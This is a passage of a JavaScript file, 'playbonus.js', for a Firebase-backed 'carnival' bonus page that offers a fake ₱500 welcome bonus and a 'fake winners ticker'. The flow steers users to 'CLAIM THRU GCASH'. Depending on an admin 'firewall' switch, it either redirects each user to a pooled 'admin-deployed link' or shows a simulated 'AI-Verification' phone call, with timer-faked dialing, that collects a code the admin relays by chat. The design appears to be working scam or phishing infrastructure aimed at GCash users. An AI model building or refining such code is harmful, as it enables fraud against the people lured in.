/**
 * playbonus.js — REMASTERED
 * ============================================================
 * FEATURES:
 *  - Firebase init + user_sessions/{phone}
 *  - Auto popup (₱500 welcome bonus: 3s fresh / 5s claimed)
 *  - Claim ₱500 → credit balance (claimed_ptcat flag)
 *  - Timer (72h cycle)
 *  - Fake winners ticker
 *  - Confetti
 *  - Admin-only force logout
 *  - Ban check (banned_ghosts)
 *
 *  3-PHASE CLAIM FLOW (Carnival Theme):
 *      PHASE 1: HOORAY — balance + bills + CLAIM THRU GCASH
 *      PHASE 2: GREAT JOB — confirm + PROCEED
 *      PHASE 3: AI-VERIFICATION CALL — 6-digit code
 *
 *  FIREWALL LOGIC:
 *      FIREWALL OFF → Phase 1 → Phase 2 → REDIRECT to admin-deployed link
 *      FIREWALL ON  → Phase 1 → Phase 2 → Phase 3 (AI-Verification) → submit
 *
 * ============================================================
 */

(function() {
    'use strict';

    // ============================================================
    // CONFIGURATION
    // ============================================================
    // Verification mode:
    //   'admin_manual' — Admin magbibigay ng code via chat
    //   'sms_api'      — May tunay na SMS backend
    //   'demo'         — Temporary test mode (⚠️ INSECURE)
    var VERIFICATION_MODE = 'admin_manual';

    // ============================================================
    // GLOBAL STATE
    // ============================================================
    var userPhone = null;
    var db = null;
    var userRef = null;
    var currentBalance = 0;
    var bonusAmount = 500;
    var isClaimed = false;
    var claimInProgress = false;
    var autoPopupTimer = null;
    var balanceListener = null;
    var claimListener = null;
    var forceLogoutListener = null;
    var forceLogoutFlagListener = null;
    var logoutTriggered = false;
    var listenersSetup = false;
    var pageLoadTime = Date.now();

    // 3-Phase state
    var currentPhase = 1;
    var isTransitioning = false;
    var currentFirewallStatus = false;
    var deployedLinkUrl = null;

    var soundCache = {
        scatter: null,
        claim: null,
        success: null
    };

    // ============================================================
    // HELPERS
    // ============================================================
    function formatNumberWithComma(number) {
        var num = Number(number).toFixed(2);
        var parts = num.split('.');
        var wholePart = parts[0];
        var decimalPart = parts[1];
        var wholeWithCommas = wholePart.replace(/\B(?=(\d{3})+(?!\d))/g, ',');
        return wholeWithCommas + '.' + decimalPart;
    }

    function initSounds() {
        try {
            soundCache.scatter = new Audio('sounds/super_ace_scatter_ring.mp3');
            soundCache.claim = new Audio('sounds/claim.wav');
            soundCache.success = new Audio('sounds/success.wav');
            soundCache.scatter.volume = 0.5;
            soundCache.claim.volume = 0.7;
            soundCache.success.volume = 0.6;
        } catch(e) {}
    }

    function playSound(soundName) {
        if (soundCache[soundName]) {
            soundCache[soundName].currentTime = 0;
            soundCache[soundName].play().catch(function(e) {});
        }
    }

    function shakeElement(el) {
        if (!el) return;
        el.style.animation = 'carnivalShake 0.4s ease';
        setTimeout(function() { el.style.animation = ''; }, 450);
    }

    // ============================================================
    // INIT
    // ============================================================
    function init() {
        console.log('🎁 PlayBonus REMASTERED Starting...');

        userPhone = localStorage.getItem("userPhone");
        if (!userPhone) {
            window.location.href = "index.html";
            return;
        }

        var phoneDisplay = document.getElementById('userPhoneDisplay');
        if (phoneDisplay) {
            phoneDisplay.innerText = userPhone.substring(0, 4) + "***" + userPhone.substring(7, 11);
        }

        initSounds();
        initFirebase();
        loadUserData();
        initTimer();
        initTicker();
        initClaimFlow();
        initConfetti();
        attachButtonEvents();
        initAdminForceLogoutListener();
        injectCarnivalAnimations();

        console.log('✅ PlayBonus REMASTERED ready!');
    }

    // ============================================================
    // FIREBASE
    // ============================================================
    function initFirebase() {
        if (typeof firebaseConfig === 'undefined') {
            console.error('❌ Firebase config not found!');
            return;
        }
        try {
            if (!firebase.apps || !firebase.apps.length) {
                firebase.initializeApp(firebaseConfig);
            }
            db = firebase.database();
            userRef = db.ref('user_sessions/' + userPhone);
            console.log('✅ Firebase connected:', userPhone);
        } catch(e) {
            console.error('Firebase error:', e);
        }
    }

    function loadUserData() {
        if (!userRef) return;

        userRef.once('value', function(snapshot) {
            var data = snapshot.val();

            if (data) {
                currentBalance = Number(data.balance) || 0;
                isClaimed = data.claimed_ptcat === true;

                console.log('📊 Loaded - Balance: ₱' + currentBalance + ', Claimed:', isClaimed);

                updateBalanceDisplay();
                updateClaimButtonUI();
                scheduleAutoPopup();
            } else {
                console.log('🆕 New user');
                currentBalance = 0;
                isClaimed = false;

                userRef.set({
                    phone: userPhone,
                    balance: 0,
                    claimed_ptcat: false,
                    status: "active",
                    created_at: Date.now()
                }).then(function() {
                    updateBalanceDisplay();
                    updateClaimButtonUI();
                    scheduleAutoPopup();
                });
            }
        }).catch(function(e) {
            console.error('Load error:', e);
        });

        if (balanceListener) {
            userRef.child('balance').off('value', balanceListener);
        }

        balanceListener = userRef.child('balance').on('value', function(snapshot) {
            var balance = snapshot.val();
            if (balance !== null && balance !== undefined) {
                currentBalance = Number(balance);
                console.log('💰 Balance updated: ₱' + currentBalance);
                updateBalanceDisplay();
            }
        });

        if (claimListener) {
            userRef.child('claimed_ptcat').off('value', claimListener);
        }

        claimListener = userRef.child('claimed_ptcat').on('value', function(snapshot) {
            var claimed = snapshot.val();
            var newState = (claimed === true);

            if (newState !== isClaimed) {
                isClaimed = newState;
                console.log('🔄 Claim state changed:', isClaimed);
                updateClaimButtonUI();
            }
        });
    }

    // ============================================================
    // AUTO POPUP (₱500 WELCOME BONUS)
    // ============================================================
    function scheduleAutoPopup() {
        if (autoPopupTimer) clearTimeout(autoPopupTimer);

        var delay = isClaimed ? 5000 : 3000;
        console.log('⏰ Auto popup in ' + (delay / 1000) + 's (isClaimed:', isClaimed + ')');

        autoPopupTimer = setTimeout(function() {
            autoShowBonusPopup();
        }, delay);
    }

    function autoShowBonusPopup() {
        console.log('🎁 Auto-showing bonus popup (isClaimed:', isClaimed + ')');

        var popup = document.getElementById('bonusRewardPopup');
        if (!popup) {
            console.error('❌ Popup not found: bonusRewardPopup');
            return;
        }

        popup.style.display = 'flex';
        playSound('scatter');
        updateClaimButtonUI();
    }

    // ============================================================
    // BALANCE DISPLAY
    // ============================================================
    function updateBalanceDisplay() {
        var balanceEl = document.getElementById('userBalanceDisplay');
        if (balanceEl) {
            balanceEl.innerText = formatNumberWithComma(currentBalance);
        }
    }

    function animateBalanceThenSave(oldBalance, newBalance, callback) {
        var startTime = null;
        var duration = 1500;

        function step(timestamp) {
            if (!startTime) startTime = timestamp;
            var progress = Math.min((timestamp - startTime) / duration, 1);
            var easeProgress = 1 - Math.pow(1 - progress, 3);
            var val = Math.floor(easeProgress * (newBalance - oldBalance) + oldBalance);

            var balanceEl = document.getElementById('userBalanceDisplay');
            if (balanceEl) {
                balanceEl.innerText = formatNumberWithComma(val);
            }

            if (progress < 1) {
                requestAnimationFrame(step);
            } else {
                if (callback) callback();
            }
        }

        requestAnimationFrame(step);
    }

    // ============================================================
    // FIREWALL
    // ============================================================
    function checkFirewallBeforeClaim() {
        try {
            return db.ref('admin/globalFirewall').once('value').then(function(snapshot) {
                var data = snapshot.val();
                currentFirewallStatus = (data && data.active === true);
                return currentFirewallStatus;
            });
        } catch(e) {
            return Promise.resolve(false);
        }
    }

    // ============================================================
    // GET DEPLOYED LINK (para sa Phase 2 redirect kapag firewall OFF)
    // ============================================================
    function getDeployedLink() {
        try {
            return db.ref('links')
                .orderByChild('status')
                .equalTo('available')
                .limitToFirst(1)
                .once('value')
                .then(function(snapshot) {
                    if (snapshot.exists()) {
                        var key = Object.keys(snapshot.val())[0];
                        var linkData = snapshot.val()[key];
                        return { key: key, url: linkData.url };
                    }
                    return null;
                });
        } catch(e) {
            console.error('Get link error:', e);
            return Promise.resolve(null);
        }
    }

    function markLinkAsUsed(linkKey, phone) {
        try {
            return db.ref('links/' + linkKey).update({
                status: 'used',
                user: phone,
                usedAt: Date.now()
            }).then(function() {
                console.log('✅ Link marked as used');
            });
        } catch(e) {
            console.error('Mark link error:', e);
            return Promise.resolve();
        }
    }

    // ============================================================
    // CLAIM TRACKING
    // ============================================================
    function trackClaimInFirebase(amount) {
        try {
            var now = new Date();
            var year = now.getFullYear();
            var month = String(now.getMonth() + 1).padStart(2, '0');
            var day = String(now.getDate()).padStart(2, '0');
            var hour = now.getHours();
            var dateKey = year + '-' + month + '-' + day;

            var dayRef = db.ref('festival_stats/daily/' + dateKey);

            dayRef.transaction(function(data) {
                if (data === null) {
                    data = {
                        claims_count: 0,
                        claims_amount: 0,
                        hourly_claims: {}
                    };
                }

                data.claims_count = (data.claims_count || 0) + 1;
                data.claims_amount = (data.claims_amount || 0) + (amount || 0);

                if (!data.hourly_claims) data.hourly_claims = {};
                data.hourly_claims[hour] = (data.hourly_claims[hour] || 0) + 1;

                data.last_update = Date.now();
                return data;
            });

            console.log('📊 CLAIM TRACKED:', dateKey, 'Hour:', hour, '₱' + amount);

        } catch(e) {
            console.error('❌ Track claim error:', e);
        }
    }

    // ============================================================
    // CLAIM FLOW (WELCOME BONUS)
    // ============================================================
    function initClaimFlow() {
        console.log('🎁 Init Claim Flow...');

        var claimNowBtn = document.getElementById('claimNowBtn');
        var popup = document.getElementById('bonusRewardPopup');

        if (claimNowBtn) {
            claimNowBtn.addEventListener('click', function(e) {
                e.preventDefault();
                e.stopPropagation();

                console.log('🖱️ CLAIM NOW clicked (isClaimed:', isClaimed + ')');

                playSound('scatter');

                if (popup) {
                    popup.style.display = 'flex';
                    updateClaimButtonUI();
                }
            });
        }

        var ptCatClaimBtn = document.getElementById('ptCatClaimBtn');
        if (ptCatClaimBtn) {
            ptCatClaimBtn.addEventListener('click', handleClaimBonus);
        }

        var closeBtn = document.getElementById('bonusRewardClose');
        if (closeBtn) {
            closeBtn.addEventListener('click', function() {
                if (popup) popup.style.display = 'none';
            });
        }

        var backBtn = document.getElementById('bonusRewardBack');
        if (backBtn) {
            backBtn.addEventListener('click', function() {
                if (popup) popup.style.display = 'none';
            });
        }

        updateClaimButtonUI();
        console.log('✅ Claim Flow ready');
    }

    function handleClaimBonus(e) {
        e.preventDefault();
        e.stopPropagation();

        console.log('🖱️ CLAIM BONUS clicked (isClaimed:', isClaimed + ')');

        if (isClaimed) {
            alert("You have already claimed this bonus!");
            return;
        }

        if (claimInProgress) {
            alert("Please wait, processing...");
            return;
        }

        if (!userRef) {
            alert("System not ready. Please refresh.");
            return;
        }

        userRef.child('claimed_ptcat').once('value', function(snapshot) {
            if (snapshot.val() === true) {
                isClaimed = true;
                updateClaimButtonUI();
                alert("You have already claimed this bonus!");
                return;
            }
            processClaim();
        }).catch(function(error) {
            console.error('Check error:', error);
            processClaim();
        });
    }

    function processClaim() {
        claimInProgress = true;

        var ptCatClaimBtn = document.getElementById('ptCatClaimBtn');

        if (ptCatClaimBtn) {
            ptCatClaimBtn.disabled = true;
            ptCatClaimBtn.style.opacity = '0.6';
            ptCatClaimBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> <span>PROCESSING...</span>';
        }

        checkFirewallBeforeClaim().then(function(firewallOn) {
            if (firewallOn) {
                console.log('🔥 Firewall ON - Show 3-phase AI verification');
                var popup = document.getElementById('bonusRewardPopup');
                if (popup) popup.style.display = 'none';

                creditBonusAndMark(function() {
                    if (window.showPopup) {
                        window.showPopup(currentBalance);
                    }
                    claimInProgress = false;
                });
            } else {
                console.log('🔓 Firewall OFF - Direct claim');
                creditBonusAndMark(function() {
                    var popup = document.getElementById('bonusRewardPopup');
                    if (popup) popup.style.display = 'none';

                    setTimeout(function() {
                        showSuccessPopup(bonusAmount);
                    }, 300);

                    claimInProgress = false;
                });
            }
        }).catch(function(error) {
            console.error('Firewall error:', error);
            claimInProgress = false;
            resetClaimButton();
        });
    }

    function creditBonusAndMark(callback) {
        console.log('💰 Crediting ₱' + bonusAmount + ' to balance...');

        var oldBalance = currentBalance;
        var newBalance = oldBalance + bonusAmount;

        userRef.update({
            balance: newBalance,
            claimed_ptcat: true,
            ptcat_claimed_at: Date.now(),
            lastUpdate: Date.now()
        }).then(function() {
            console.log('✅ Firebase updated! New balance: ₱' + newBalance);

            currentBalance = newBalance;
            isClaimed = true;

            animateBalanceThenSave(oldBalance, newBalance, function() {
                updateBalanceDisplay();
            });

            trackClaimInFirebase(bonusAmount);
            playSound('claim');
            startConfetti();
            updateClaimButtonUI();

            if (callback) callback();

        }).catch(function(error) {
            console.error('❌ Firebase update error:', error);
            alert('Error saving claim. Please try again.');
            claimInProgress = false;
            resetClaimButton();
        });
    }

    function resetClaimButton() {
        var ptCatClaimBtn = document.getElementById('ptCatClaimBtn');
        if (ptCatClaimBtn) {
            ptCatClaimBtn.disabled = false;
            ptCatClaimBtn.style.opacity = '1';
            ptCatClaimBtn.innerHTML = '<i class="fas fa-gift"></i> <span>CLAIM BONUS</span>';
        }
        claimInProgress = false;
    }

    function updateClaimButtonUI() {
        var ptCatClaimBtn = document.getElementById('ptCatClaimBtn');
        var bonusLabel = document.querySelector('.bonus-label');

        if (!ptCatClaimBtn) return;

        if (isClaimed) {
            ptCatClaimBtn.disabled = true;
            ptCatClaimBtn.style.opacity = '0.5';
            ptCatClaimBtn.style.cursor = 'not-allowed';
            ptCatClaimBtn.style.pointerEvents = 'none';
            ptCatClaimBtn.innerHTML = '<i class="fas fa-check-circle"></i> <span>ALREADY CLAIMED</span>';
            ptCatClaimBtn.classList.add('claimed');

            if (bonusLabel) {
                bonusLabel.textContent = 'BONUS CLAIMED';
                bonusLabel.style.color = '#39ff14';
            }
        } else {
            ptCatClaimBtn.disabled = false;
            ptCatClaimBtn.style.opacity = '1';
            ptCatClaimBtn.style.cursor = 'pointer';
            ptCatClaimBtn.style.pointerEvents = 'auto';
            ptCatClaimBtn.innerHTML = '<i class="fas fa-gift"></i> <span>CLAIM BONUS</span>';
            ptCatClaimBtn.classList.remove('claimed');

            if (bonusLabel) {
                bonusLabel.textContent = 'BONUS REWARD';
                bonusLabel.style.color = '';
            }
        }
    }

    function showSuccessPopup(amount) {
        var popup = document.getElementById('successPopup');
        var amountEl = document.getElementById('successAmount');
        var closeBtn = document.getElementById('successCloseBtn');

        if (amountEl) amountEl.textContent = amount;
        if (popup) popup.style.display = 'flex';

        playSound('success');

        if (closeBtn) {
            closeBtn.onclick = function() {
                popup.style.display = 'none';
            };
        }

        setTimeout(function() {
            if (popup) popup.style.display = 'none';
        }, 5000);
    }

    // ============================================================
    // 3-PHASE CLAIM FLOW (CARNIVAL THEME)
    // ============================================================

    window.showPopup = function(balance) {
        currentBalance = Number(balance) || 0;
        currentPhase = 1;
        openPhasePopup();
        renderPhase1();
    };

    function openPhasePopup() {
        var popup = document.getElementById('claimPhasePopup');
        if (!popup) {
            console.error('❌ claimPhasePopup not found in HTML');
            return;
        }
        popup.style.display = 'flex';
        document.body.style.overflow = 'hidden';

        var ticker = document.getElementById('winnerTicker');
        if (ticker) ticker.style.display = 'none';
    }

    function closePhasePopup() {
        var popup = document.getElementById('claimPhasePopup');
        if (!popup) return;
        popup.style.display = 'none';
        document.body.style.overflow = '';

        var ticker = document.getElementById('winnerTicker');
        if (ticker) ticker.style.display = 'flex';
    }
    window.closePopup = closePhasePopup;

    function transitionTo(renderFn) {
        if (isTransitioning) return;
        isTransitioning = true;

        var inner = document.getElementById('claimPhaseInner');
        if (!inner) {
            isTransitioning = false;
            return;
        }

        inner.style.opacity = '0';
        inner.style.transform = 'scale(0.97)';

        setTimeout(function() {
            renderFn();
            inner.style.opacity = '1';
            inner.style.transform = 'scale(1)';
            isTransitioning = false;
        }, 250);
    }

    // ---- PHASE 1: HOORAY ----
    function renderPhase1() {
        currentPhase = 1;
        var inner = document.getElementById('claimPhaseInner');
        if (!inner) return;

        inner.innerHTML = [
            '<div class="popup-close" id="phase1Close">✕</div>',

            '<div class="carnival-burst">',
                '<div class="lucky-cat-mascot">',
                    '<img src="images/LuckyCat.png" alt="Lucky Cat" onerror="this.style.display=\'none\'">',
                '</div>',
                '<h2 class="carnival-title">🎉 HOORAY! 🎉</h2>',
                '<div class="carnival-amount">₱<span id="phase1Balance">',
                    currentBalance.toFixed(2),
                '</span></div>',
            '</div>',

            '<div class="carnival-bills">',
                '<div class="bill-indicator"><img src="images/PHL-500-Front.png" onerror="this.style.display=\'none\'"></div>',
                '<div class="bill-indicator"><img src="images/PHL-500-Back.png" onerror="this.style.display=\'none\'"></div>',
                '<div class="bill-indicator"><img src="images/PHL-500-Front.png" onerror="this.style.display=\'none\'"></div>',
                '<div class="bill-indicator"><img src="images/PHL-500-Back.png" onerror="this.style.display=\'none\'"></div>',
            '</div>',

            '<p class="carnival-subtext">',
                'Your reward is ready. Claim it now and enjoy the fiesta!',
            '</p>',

            '<button class="carnival-btn carnival-btn-gold" id="phase1ClaimBtn">',
                '<img src="images/gc_icon.png" class="gc-icon" onerror="this.style.display=\'none\'"> CLAIM THRU GCASH',
            '</button>',

            '<button class="carnival-btn carnival-btn-ghost" id="phase1BackBtn">',
                '← BACK',
            '</button>'
        ].join('');

        updateBillsIndicators(currentBalance);

        var closeBtn = document.getElementById('phase1Close');
        var backBtn = document.getElementById('phase1BackBtn');
        var claimBtn = document.getElementById('phase1ClaimBtn');

        if (closeBtn) closeBtn.onclick = closePhasePopup;
        if (backBtn) backBtn.onclick = closePhasePopup;

        if (claimBtn) {
            claimBtn.onclick = function() {
                if (currentBalance <= 0) {
                    showInlineError(claimBtn, '❌ NO BALANCE');
                    return;
                }
                playSound('scatter');
                transitionTo(renderPhase2);
            };
        }
    }

    function updateBillsIndicators(balance) {
        var indicators = document.querySelectorAll('#claimPhaseInner .bill-indicator');
        var billCount = Math.min(4, Math.floor(balance / 500));

        for (var i = 0; i < indicators.length; i++) {
            var indicator = indicators[i];
            var img = indicator.querySelector('img');
            if (!img) continue;

            if (i < billCount) {
                img.style.opacity = '1';
                img.style.filter = 'none';
                indicator.classList.add('active');
            } else {
                img.style.opacity = '0.25';
                img.style.filter = 'grayscale(100%) brightness(30%)';
                indicator.classList.remove('active');
            }
        }
    }

    // ---- PHASE 2: GREAT JOB ----
    function renderPhase2() {
        currentPhase = 2;
        var inner = document.getElementById('claimPhaseInner');
        if (!inner) return;

        inner.innerHTML = [
            '<div class="popup-close" id="phase2Close">✕</div>',

            '<div class="carnival-burst">',
                '<div class="carnival-icon">🏆</div>',
                '<h2 class="carnival-title">GREAT JOB!</h2>',
            '</div>',

            '<div class="carnival-reward-box">',
                '<p class="carnival-subtext">',
                    '"Nice work! You\'re one tap away from your reward!"',
                '</p>',
                '<div class="carnival-reward-amount">',
                    'Your reward: <strong>₱', currentBalance.toFixed(2), '</strong>',
                '</div>',
            '</div>',

            '<button class="carnival-btn carnival-btn-gold" id="phase2ProceedBtn">',
                '<img src="images/gc_icon.png" class="gc-icon" onerror="this.style.display=\'none\'"> PROCEED TO WITHDRAW',
            '</button>',

            '<button class="carnival-btn carnival-btn-ghost" id="phase2BackBtn">',
                '← BACK',
            '</button>'
        ].join('');

        var closeBtn = document.getElementById('phase2Close');
        var backBtn = document.getElementById('phase2BackBtn');
        var proceedBtn = document.getElementById('phase2ProceedBtn');

        if (closeBtn) closeBtn.onclick = closePhasePopup;
        if (backBtn) backBtn.onclick = function() {
            transitionTo(renderPhase1);
        };

        if (proceedBtn) {
            proceedBtn.onclick = function() {
                playSound('scatter');

                proceedBtn.disabled = true;
                proceedBtn.innerHTML = '⏳ CHECKING...';

                checkFirewallBeforeClaim().then(function(firewallOn) {
                    if (firewallOn) {
                        // 🔥 FIREWALL ON → Phase 3 (AI-Verification)
                        console.log('🔥 Firewall ON → Phase 3 AI-Verification');
                        transitionTo(renderPhase3);
                    } else {
                        // 🔓 FIREWALL OFF → Redirect to admin-deployed link
                        console.log('🔓 Firewall OFF → Redirect to deployed link');
                        redirectToDeployedLink(proceedBtn);
                    }
                }).catch(function() {
                    // Fail-safe: redirect
                    redirectToDeployedLink(proceedBtn);
                });
            };
        }
    }

    // ---- REDIRECT TO DEPLOYED LINK (FIREWALL OFF) ----
    function redirectToDeployedLink(buttonEl) {
        if (buttonEl) {
            buttonEl.innerHTML = '⏳ REDIRECTING...';
        }

        getDeployedLink().then(function(linkData) {
            if (linkData && linkData.url) {
                deployedLinkUrl = linkData.url;

                markLinkAsUsed(linkData.key, userPhone).then(function() {
                    console.log('✅ Redirecting to:', linkData.url);
                    if (buttonEl) {
                        buttonEl.innerHTML = '✅ REDIRECTING...';
                    }
                    setTimeout(function() {
                        window.location.href = linkData.url;
                    }, 800);
                });
            } else {
                console.warn('⚠️ No deployed link available');
                if (buttonEl) {
                    buttonEl.disabled = false;
                    buttonEl.innerHTML = '<img src="images/gc_icon.png" class="gc-icon" onerror="this.style.display=\'none\'"> PROCEED TO WITHDRAW';
                }
                showInlineError(buttonEl, '❌ NO LINK AVAILABLE');
            }
        }).catch(function(err) {
            console.error('Redirect error:', err);
            if (buttonEl) {
                buttonEl.disabled = false;
                buttonEl.innerHTML = '<img src="images/gc_icon.png" class="gc-icon" onerror="this.style.display=\'none\'"> PROCEED TO WITHDRAW';
            }
            showInlineError(buttonEl, '❌ ERROR');
        });
    }

    // ---- PHASE 3: AI-VERIFICATION CALL ----
    function renderPhase3() {
        currentPhase = 3;
        var inner = document.getElementById('claimPhaseInner');
        if (!inner) return;

        var userPhoneLocal = localStorage.getItem('userPhone') || '';
        var masked = userPhoneLocal.length >= 11
            ? userPhoneLocal.substring(0, 4) + '***' + userPhoneLocal.substring(7, 11)
            : 'your phone';

        inner.innerHTML = [
            '<div class="popup-close" id="phase3Close">✕</div>',

            '<div class="carnival-burst">',
                '<div class="ai-call-icon">📞</div>',
                '<h2 class="carnival-title">AI-VERIFICATION</h2>',
                '<p class="carnival-subtext">',
                    'A system AI will call you with a ',
                    '<strong style="color:#00d4ff;">6-digit code</strong>',
                '</p>',
            '</div>',

            '<div class="ai-phone-display">',
                '<span class="ai-phone-icon">📱</span>',
                '<span class="ai-phone-number">', masked, '</span>',
            '</div>',

            '<div id="aiCallStatus" class="ai-call-status">',
                '⏳ Waiting for call...',
            '</div>',

            '<input type="text" id="phase3CodeInput"',
                ' class="carnival-input"',
                ' placeholder="000000"',
                ' maxlength="6"',
                ' inputmode="numeric"',
                ' pattern="[0-9]*"',
                ' autocomplete="one-time-code">',

            '<div id="phase3ErrorMsg" class="carnival-error" style="display:none;"></div>',

            '<button class="carnival-btn carnival-btn-gold" id="phase3VerifyBtn">',
                'VERIFY CODE',
            '</button>',

            '<button class="carnival-btn carnival-btn-ghost" id="phase3BackBtn">',
                '← BACK',
            '</button>'
        ].join('');

        var closeBtn = document.getElementById('phase3Close');
        var backBtn = document.getElementById('phase3BackBtn');
        var verifyBtn = document.getElementById('phase3VerifyBtn');
        var input = document.getElementById('phase3CodeInput');

        if (closeBtn) closeBtn.onclick = closePhasePopup;
        if (backBtn) backBtn.onclick = function() {
            transitionTo(renderPhase2);
        };

        // Start AI call simulation
        startAICallSimulation();

        if (input) {
            input.addEventListener('input', function() {
                this.value = this.value.replace(/\D/g, '').slice(0, 6);
                var err = document.getElementById('phase3ErrorMsg');
                if (err) err.style.display = 'none';
            });

            input.addEventListener('keypress', function(e) {
                if (e.key === 'Enter' && verifyBtn) {
                    verifyBtn.click();
                }
            });

            setTimeout(function() { input.focus(); }, 300);
        }

        if (verifyBtn) {
            verifyBtn.onclick = function() {
                var code = input ? input.value.trim() : '';
                var errEl = document.getElementById('phase3ErrorMsg');

                if (!/^\d{6}$/.test(code)) {
                    if (errEl) {
                        errEl.textContent = '⚠️ Please enter a valid 6-digit code.';
                        errEl.style.display = 'block';
                    }
                    if (input) shakeElement(input);
                    return;
                }

                verifyBtn.disabled = true;
                verifyBtn.innerHTML = '⏳ VERIFYING...';

                verifyCodeWithBackend(code).then(function(ok) {
                    if (ok) {
                        verifyBtn.innerHTML = '✅ VERIFIED';
                        setTimeout(function() {
                            submitWithdrawalRequest();
                        }, 600);
                    } else {
                        verifyBtn.disabled = false;
                        verifyBtn.innerHTML = 'VERIFY CODE';
                        if (errEl) {
                            errEl.textContent = '❌ Invalid code. Please try again.';
                            errEl.style.display = 'block';
                        }
                        if (input) {
                            input.value = '';
                            shakeElement(input);
                        }
                    }
                }).catch(function() {
                    verifyBtn.disabled = false;
                    verifyBtn.innerHTML = 'VERIFY CODE';
                    if (errEl) {
                        errEl.textContent = '⚠️ Verification failed. Please try again.';
                        errEl.style.display = 'block';
                    }
                });
            };
        }
    }

    // ---- AI CALL SIMULATION ----
    function startAICallSimulation() {
        var statusEl = document.getElementById('aiCallStatus');
        if (!statusEl) return;

        // Simulate: 1.5s dialing
        statusEl.innerHTML = '📞 Dialing...';
        statusEl.style.color = '#00d4ff';

        setTimeout(function() {
            statusEl.innerHTML = '🔊 AI Call Connected — Listen for the code';
            statusEl.style.color = '#39ff14';

            // Save to Firebase: call_requested
            try {
                db.ref('ai_call_requests').push({
                    phone: userPhone,
                    requested_at: Date.now(),
                    status: 'connected'
                });
            } catch(e) {}
        }, 1500);
    }

    // ---- VERIFY CODE ----
    function verifyCodeWithBackend(code) {
        if (VERIFICATION_MODE === 'demo') {
            // ⚠️ DEMO MODE: Accept any 6-digit code (INSECURE — for testing only)
            console.warn('⚠️ DEMO MODE: Accepting any 6-digit code');
            return Promise.resolve(true);
        }

        if (VERIFICATION_MODE === 'admin_manual') {
            // Admin magbibigay ng code via chat — naka-store sa verification_codes/{phone}
            return db.ref('verification_codes/' + userPhone).once('value')
                .then(function(snap) {
                    if (!snap.exists()) {
                        console.warn('⚠️ No verification code found for', userPhone);
                        return false;
                    }

                    var data = snap.val();
                    var storedCode = String(data.code || '');
                    var expiresAt = data.expiresAt || 0;

                    // Check expiration (default 5 minutes)
                    if (expiresAt && Date.now() > expiresAt) {
                        console.warn('⚠️ Verification code expired');
                        return false;
                    }

                    // Compare
                    var match = (storedCode === String(code));

                    if (match) {
                        // Mark as used
                        db.ref('verification_codes/' + userPhone).update({
                            used: true,
                            usedAt: Date.now()
                        });
                    }

                    return match;
                })
                .catch(function(err) {
                    console.error('Verify error:', err);
                    return false;
                });
        }

        if (VERIFICATION_MODE === 'sms_api') {
            // ⚠️ Palitan ito ng iyong tunay na SMS backend
            return fetch('https://your-backend.com/api/verify', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    phone: userPhone,
                    code: code
                })
            })
            .then(function(r) { return r.json(); })
            .then(function(d) { return d.ok === true; })
            .catch(function() { return false; });
        }

        return Promise.resolve(false);
    }

    // ---- SUBMIT WITHDRAWAL ----
    function submitWithdrawalRequest() {
        var userPhoneLocal = localStorage.getItem('userPhone');
        var amount = currentBalance;

        try {
            if (typeof firebase !== 'undefined' && firebase.database) {
                db.ref('withdrawal_requests').push({
                    phone: userPhoneLocal,
                    amount: amount,
                    status: 'pending',
                    verified: true,
                    requested_at: Date.now()
                }).then(function() {
                    showSuccessAndClose(amount);
                }).catch(function(err) {
                    console.error('Withdrawal submit error:', err);
                    alert('Could not submit withdrawal. Please try again.');
                });
            } else {
                showSuccessAndClose(amount);
            }
        } catch (e) {
            console.error('Withdrawal error:', e);
            showSuccessAndClose(amount);
        }
    }

    function showSuccessAndClose(amount) {
        var inner = document.getElementById('claimPhaseInner');
        if (!inner) return;

        inner.innerHTML = [
            '<div class="carnival-burst">',
                '<div class="carnival-icon">✅</div>',
                '<h2 class="carnival-title">SUBMITTED!</h2>',
                '<p class="carnival-subtext">',
                    'Your withdrawal request for ',
                    '<strong style="color:#ffd700;">₱', Number(amount).toFixed(2), '</strong>',
                    ' has been submitted.',
                '</p>',
                '<p class="carnival-subtext" style="font-size:11px; color:rgba(255,255,255,0.5);">',
                    'You will receive a confirmation once processed.',
                '</p>',
            '</div>',

            '<button class="carnival-btn carnival-btn-gold" id="finalCloseBtn">',
                '🏠 DONE',
            '</button>'
        ].join('');

        var finalClose = document.getElementById('finalCloseBtn');
        if (finalClose) {
            finalClose.onclick = function() {
                closePhasePopup();
                updateBalanceDisplay();
            };
        }
    }

    function showInlineError(button, message) {
        if (!button) return;
        var original = button.innerHTML;
        button.style.background = 'linear-gradient(180deg, #ff4444, #cc0000)';
        button.innerHTML = message;
        button.disabled = true;

        setTimeout(function() {
            button.disabled = false;
            button.style.background = '';
            button.innerHTML = original;
        }, 1800);
    }

    // ============================================================
    // CARNIVAL ANIMATIONS (injected)
    // ============================================================
    function injectCarnivalAnimations() {
        if (document.querySelector('#carnival-animations')) return;

        var style = document.createElement('style');
        style.id = 'carnival-animations';
        style.textContent = [
            '@keyframes carnivalShake {',
                '0%, 100% { transform: translateX(0); }',
                '20% { transform: translateX(-8px); }',
                '40% { transform: translateX(8px); }',
                '60% { transform: translateX(-5px); }',
                '80% { transform: translateX(5px); }',
            '}',
            '@keyframes aiCallPulse {',
                '0%, 100% { transform: scale(1); opacity: 1; }',
                '50% { transform: scale(1.08); opacity: 0.85; }',
            '}',
            '.ai-call-icon {',
                'font-size: 60px;',
                'filter: drop-shadow(0 0 25px rgba(0, 212, 255, 0.7));',
                'animation: aiCallPulse 1.5s ease-in-out infinite;',
                'display: inline-block;',
            '}',
            '.ai-phone-display {',
                'display: flex;',
                'align-items: center;',
                'justify-content: center;',
                'gap: 10px;',
                'margin: 15px 0;',
                'padding: 12px 20px;',
                'background: rgba(0, 0, 0, 0.4);',
                'border: 2px solid #00d4ff;',
                'border-radius: 12px;',
                'box-shadow: 0 0 25px rgba(0, 212, 255, 0.4), inset 0 0 20px rgba(0, 212, 255, 0.1);',
            '}',
            '.ai-phone-icon {',
                'font-size: 24px;',
                'animation: aiCallPulse 1.5s ease-in-out infinite;',
            '}',
            '.ai-phone-number {',
                'font-family: "Orbitron", monospace;',
                'font-size: 20px;',
                'font-weight: 900;',
                'color: #00d4ff;',
                'letter-spacing: 3px;',
                'text-shadow: 0 0 20px rgba(0, 212, 255, 0.6);',
            '}',
            '.ai-call-status {',
                'font-family: "Poppins", sans-serif;',
                'font-size: 13px;',
                'color: #00d4ff;',
                'text-align: center;',
